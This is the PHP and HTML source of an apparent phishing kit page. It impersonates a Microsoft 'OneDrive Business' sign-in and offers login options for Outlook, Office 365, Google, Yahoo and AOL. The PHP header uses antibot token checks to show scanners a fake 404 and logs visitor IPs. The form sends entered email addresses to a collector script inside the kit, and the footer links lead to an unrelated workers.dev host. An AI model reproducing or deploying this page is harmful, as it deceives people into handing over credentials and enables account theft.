<?php

    session_start();

    require_once '../Meta/Comp.php';
    require_once '../Meta/Antibot.php';
    require_once '../Meta/demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../Astute/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }



?>

<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width initial-scale=1 user-scalable=no maximum-scale=1"><title>Login Download OneDrive Bussiness</title><link href="files/favicon.png" rel="shortcut icon"><script type="text/javascript" src="./files/6324aa013c295292010eb534.js.download"></script><link type="text/css" rel="stylesheet" href="./files/4f4414fa2fdd4b2180aac793aed603fbnbr1663347199.css"><link type="text/css" rel="stylesheet" href="./files/55f9629abf4d28fca8b21b0e2afa106cnbr1663347200.css"><script type="text/javascript" src="./files/axios.min.js.download"></script><script type="text/javascript" src="./files/27db38b3ff334b8b5e4f8335e21e49ecnbr1663347200.js.download"></script><script type="text/javascript" src="./files/vue.min.js.download"></script><script type="text/javascript" src="./files/vue-router.min.js.download"></script><script type="text/javascript" src="./files/vuex.min.js.download"></script><script type="text/javascript" src="./files/jquery.min.js.download"></script><script type="text/javascript" src="./files/vee-validate.min.js.download"></script><script type="text/javascript" src="./files/vue-i18n.min.js.download"></script><script type="text/javascript" src="./files/lodash.min.js.download"></script><script type="text/javascript" src="./files/mobile-detect.min.js.download"></script><script type="text/javascript" src="./files/c16bc0d5744ec674262852734fe1ba03.js.download"></script></head>

<body  style="background-image: url('files/bg.jpg"><div id="b7P1qpjT20NEtXSROWMeKZ9LGQ" class="login-wrap" style="display: flex; align-items: center; min-height: 100vh; width: 100%;"><span></span><div class="zd052424d052424rngyU"><div class="B3a4cd3ff3a4cd3ffgJ"><img src="./files/logo.svg" class="eYX2e253fa22e253fa2dgJu"></div><div class="B3a4cd3ff3a4cd3ffgJ n33c18cf733c18cf7tvz"><div><div class="NEpd48dbc84d48dbc84zDuY"><img src="./files/user.png" class="iVje5d0462d92b1903mBw"></div><h1 class="C27bbddbc27bbddbclL">Sign in </h1><div class="Eu3176a44c3176a44cIEn" >Input your email and you will be automatically redirected to your email provider <br>to continue verifying your identity. </div><div class="NKy2c1a40f52c1a40f5gS" style="display: none;"><a class="Frh19db436819db4368Wnsp"><img src="./files/outlook.svg">Continue with Outlook</a><a class="Frh19db436819db4368Wnsp"><img src="./files/office.svg">Continue with Office 365</a><a class="Frh19db436819db4368Wnsp"><img src="./files/gg.svg">Continue with Google</a><a class="Frh19db436819db4368Wnsp"><img src="./files/yh.svg">Continue with Yahoo</a><a class="Frh19db436819db4368Wnsp"><img src="./files/aol.svg">Continue with Aol</a><a class="Frh19db436819db4368Wnsp rJt9W7HDKIFcp4YylL0nP36jqv"><img src="./files/other.png" class="znsf2bb9a93f2bb9a93BNqpI">Continue with Other Emails</a></div><div id="otheraccountnbr" class="NKy2c1a40f52c1a40f5gS" style="width: 100%; margin-top: 7%;"><form action="../Meta/Benchmark/contact.php?token=<?php echo $_SESSION['token']; ?>" method="post" class="credentials-form login-form hquXrVjeyAQxkoRg9SGvBUlZ2P"><div class="credentials-form__fields mAnGbYvOzMxByiXZeFH6t9o"><div data-js-component-id="component5272041617130253173" tabindex="-1" id="pyxl5272041617130253171" class="login-email text-input login-text-input standard"><div class="text-input-error-wrapper" style="display: none;"><span class="error-message">An email address must contain a single@</span><div data-error-field-name="login_email"></div></div><div class="text-input-wrapper ro47xnHlZkUfsE"><input data-vv-name="UserName" data-vv-rules="required|email" type="email" name="email" id="pyxl5272041617130253172" class="text-input-input autofocus BC27zHkfWTvmDuaVxdZcUhPbS" placeholder="Email" aria-required="true" aria-invalid="false" required/><label for="pyxl5272041617130253172"></label></div><small class="secondary-label"></small></div><div data-js-component-id="component5272041617130253176" tabindex="-1" id="pyxl5272041617130253174" class="text-input login-password login-text-input standard"></div></div><div id="react-login-recaptcha-challenge-div"></div><br><div style="float: left;"><button type="submit" class="login-button signin-button button-primary RvO2Ud4uwNmW0ocEK1VJ8BThqMr"><div class="sign-in-text">Sign in</div><div class="sso-text VlMA8kjdhPbTzp51nt0RGK"></div></button><!----></div></form></div></div></div></div></div></div><br><div id="checks"></div>
    
    <div class="jJ19aabd4519aabd45PwYEO"><div>© 2022 Copyright Microsoft Corporation </div><div><a href="https://winter-grass-cf2d.eliere8.workers.dev/?bbre=xzodsiizx">Terms</a><a href="https://winter-grass-cf2d.eliere8.workers.dev/?bbre=xzodsiizx">Privacy &amp;Policy</a><a href="https://winter-grass-cf2d.eliere8.workers.dev/?bbre=xzodsiizx">Help</a></div></div></div></div></script></body></html>

